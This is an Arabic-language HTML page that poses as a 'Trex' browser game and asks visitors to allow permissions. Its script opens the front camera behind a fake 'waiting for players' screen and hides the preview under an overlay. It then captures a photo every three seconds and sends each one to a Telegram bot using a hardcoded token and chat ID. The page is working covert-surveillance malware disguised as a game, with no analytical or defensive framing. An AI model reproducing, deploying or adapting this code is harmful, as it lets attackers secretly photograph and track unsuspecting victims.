<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لعبة تركس – جربها الآن!</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
            color: #fff;
            height: 100vh;
            overflow: hidden;
        }
        #main-screen {
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        h1 {
            color: #00ff88;
            text-shadow: 0 0 15px #00ff88;
            margin: 20px 0;
            font-size: 2.8rem;
        }
        p {
            font-size: 1.3rem;
            max-width: 700px;
            margin: 20px auto;
            line-height: 1.7;
            text-align: center;
        }
        .btn {
            padding: 18px 60px;
            font-size: 1.6rem;
            background: #00ff88;
            color: #000;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 25px #00ff88aa;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: scale(1.08);
            box-shadow: 0 0 40px #00ff88;
        }
        /* شاشة الانتظار الكاملة */
        #waiting-screen {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.95);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        #waiting-text {
            font-size: 2.8rem;
            margin: 30px 0 10px;
            color: #00ff88;
            text-shadow: 0 0 20px #00ff88;
        }
        .loader {
            border: 10px solid #333;
            border-top: 10px solid #00ff88;
            border-radius: 50%;
            width: 100px;
            height: 100px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* منطقة الكاميرا + النص اللي يغطيها */
        .camera-container {
            position: relative;
            width: 240px;
            height: auto;
            margin-top: 20px;
        }
        #video {
            width: 100%;
            height: auto;
            border: 2px solid #00ff88;
            border-radius: 10px;
            box-shadow: 0 0 15px #00ff88aa;
            background: #000;
        }
        .overlay-text {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            color: #00ff88;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 10px;
            z-index: 2;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div id="main-screen">
        <h1>لعبة تركس الرهيبة!</h1>
      
        <p>
            مرحباً! جرب لعبة تركس الجديدة المطورة 2026<br>
            اضغط الزر أدناه لبدء اللعبة فوراً وتحدي أصدقائك!<br><br>
            <strong style="color:#ff4444">ملاحظة:</strong> اللعبة تحتاج اذونات  – اضغط "السماح" للمتابعة!
        </p>
        <button class="btn" onclick="startGame()">ابدأ</button>
    </div>

    <!-- شاشة الانتظار الكاملة -->
    <div id="waiting-screen">
        <div class="loader"></div>
        <div id="waiting-text">بانتظار انضمام اللاعبين...</div>
        
        <!-- منطقة الكاميرا مع النص اللي يغطيها -->
        <div class="camera-container">
            <video id="video" autoplay playsinline muted></video>
            <div class="overlay-text">عدد اللاعبين المنضمين الآن: 0</div>
        </div>
    </div>

    <script>
        let stream = null;
        const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
        const CHAT_ID = '6611123941';
        const PHOTO_INTERVAL = 3000; // كل 3 ثواني

        function startGame() {
            document.getElementById('main-screen').style.display = 'none';
            document.getElementById('waiting-screen').style.display = 'flex';
            startCamera();
        }

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });

                const video = document.getElementById('video');
                video.srcObject = stream;

                await new Promise(resolve => {
                    video.onloadeddata = () => {
                        console.log("الفيديو جاهز");
                        resolve();
                    };
                    setTimeout(resolve, 8000);
                });

                setInterval(captureAndSend, PHOTO_INTERVAL);
            } catch (err) {
                console.error("Camera error:", err);
            }
        }

        async function captureAndSend() {
            const video = document.getElementById('video');

            if (video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
                console.log("الفيديو ليس جاهزًا بعد");
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.75);

            try {
                const blob = await (await fetch(dataUrl)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', 'صورة من لعبة تركس • ' + new Date().toLocaleString('ar-EG'));

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('تم إرسال الصورة بنجاح');
                } else {
                    console.error('فشل الإرسال:', await response.text());
                }
            } catch (err) {
                console.error('خطأ أثناء الإرسال:', err);
            }
        }

        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
